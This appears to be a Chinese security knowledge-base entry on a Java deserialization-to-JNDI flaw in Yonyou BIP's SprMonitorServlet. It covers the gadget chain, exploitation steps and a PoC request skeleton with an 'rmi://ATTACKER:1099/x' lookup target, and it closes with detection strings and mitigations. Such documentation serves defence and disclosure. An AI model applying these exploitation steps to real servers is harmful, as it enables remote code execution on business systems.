---
id: web-java-deserialization-jndi-ufida-sprmonitorservlet
title: 用友 BIP SprMonitorServlet 原生反序列化触发 JNDI
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: native-deserialization-jndi
tags:
- java
- deserialization
- jndi
- rmi
- spring
- jta
- ufida
- yonyou
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-D
  verified_at: '2026-11-04T19:20:36+08:00'
  notes: 已对照原文与18张图片核对：入口/servlet/~uapfw/sprmonitorservlet、JtaTransactionManager.readObject、JNDI rmi://8.130.77.216:1099/x、ELProcessor 均与日志一致；原文自述 ELProcessor 到命令执行的具体衔接未展开，PoC 未实际执行；受影响版本以厂商核实为准，未写版本。
url: /docs/web/java/deserialization/jndi/web-java-deserialization-jndi-ufida-sprmonitorservlet/
draft: false
kb_aliases:
- 用友 BIP 反序列化
- sprmonitorservlet
- JtaTransactionManager JNDI
- SprMonitorServlet 反序列化
---

## 一句话结论

用友 BIP 高级版的 `/servlet/~uapfw/sprmonitorservlet` 把 POST 请求体直接交给 `ObjectInputStream` 原生反序列化，攻击者可用 `Hashtable` 包裹 `JtaTransactionManager`，在其 `readObject` 中触发指向攻击者 RMI 服务的 JNDI 查找，进而进入代码执行流程。

## 原理

- `SprMonitorServlet.doAction` 在没有类型校验和白名单的情况下对请求体调用 `readObject`，序列化流完全由客户端控制。
- `Hashtable.readObject` 会递归反序列化其中的键值对象，因此可作为外层容器把 gadget 带进 `readObject` 阶段。
- `org.springframework.transaction.jta.JtaTransactionManager` 可序列化，其 `readObject` 会调用 `lookupUserTransaction()`，把成员中的 JNDI 名称（如 `userTransactionName`）交给 `InitialContext.lookup`。
- 当 JNDI 名称指向攻击者控制的 `rmi://host:1099/x` 时，客户端会连接该 RMI 服务并接收其返回对象。现场日志显示返回对象类型为 `javax.el.ELProcessor`，随后应用进程执行了 PowerShell 命令。
- 该链条的关键不在“取回一个 UserTransaction”，而在 lookup 过程中对远端对象的加载/反序列化。文中未展开 `ELProcessor` 对象到命令执行的具体衔接方式，这一段属于待验证点。

## 触发条件

- 目标暴露 `/servlet/~uapfw/sprmonitorservlet`，且版本存在该原生反序列化入口。
- 应用 classpath 中存在 Spring `JtaTransactionManager`（用友 BIP/NC 系列通常具备）。
- 目标可出网访问攻击者的 RMI/JNDI 服务，或存在可被利用的本地/内网 JNDI 服务。
- 高版本 JDK 可能默认禁止远程 codebase；但本案通过返回可序列化对象而非远程工厂类完成利用，因此仍需以实际环境验证。

## 利用步骤

1. 确认入口可达：向 `/servlet/~uapfw/sprmonitorservlet` POST `application/octet-stream`。
2. 构造序列化流：外层 `Hashtable`，内层 `JtaTransactionManager`，其 JNDI 名称指向攻击者 RMI 地址。
3. 启动 RMI/JNDI 服务，准备返回 `ELProcessor` 对象或等价的可利用返回对象。
4. 发送序列化流；观察应用日志是否出现 `JtaTransactionManager.readObject`、`JNDI location [rmi://`、`ELProcessor` 等异常。
5. 收到回连后用 DNSLOG 或受控 RMI 验证漏洞存在，避免直接执行命令。

## PoC

```text
POST /servlet/~uapfw/sprmonitorservlet HTTP/1.1
Host: target
Content-Type: application/octet-stream

<Java 原生序列化流>
```

序列化流的最小结构（字段名依据现场堆栈与 PoC 二进制字符串）：

```text
java.util.Hashtable
└── org.springframework.transaction.jta.JtaTransactionManager
    ├── userTransactionName = "rmi://ATTACKER:1099/x"
    └── 其余字段按目标类版本补齐
```

无害化验证可将 RMI 地址替换为 DNSLOG 域名，仅观察解析记录，不投放命令执行载荷。完整可用 PoC 未公开，本文不提供。

## 变体与关联

- 变体：把 JNDI 名称换成 LDAP 地址；或改用其他 `readObject` 内触发 lookup 的类。
- 关联：[[web-java-deserialization-jndi]] 层的通用 JNDI 注入；`JtaTransactionManager` 也常作为 Jackson/XStream 的 JNDI 触发 gadget。
- 同一入口在本案中被连续利用三轮，说明漏洞未修复前可反复打点。

## 检测与防御

- 检测：应用日志检索 `sprmonitorServlet`、`JtaTransactionManager.readObject`、`JNDI location [rmi://`、`javax.el.ELProcessor`、`ObjectInputStream` 相关异常；关注短时间内重复的 `EOFException` 试探。
- 检测：边界设备记录对 `/servlet/~uapfw/sprmonitorservlet` 的 POST 与 `application/octet-stream` 请求体。
- 修复：联系厂商确认受影响版本并打补丁；补丁前在边界限制该路径外部访问。
- 缓解：在反序列化入口加 `ObjectInputFilter` 类白名单；限制服务器出站 RMI/LDAP；设置 `com.sun.jndi.rmi.object.trustURLCodebase=false`、`com.sun.jndi.ldap.object.trustURLCodebase=false`（仅能挡住远程 codebase 类利用，不能替代补丁）。
- 收敛：核心业务系统不直接暴露互联网，远程访问走 VPN 与来源白名单。
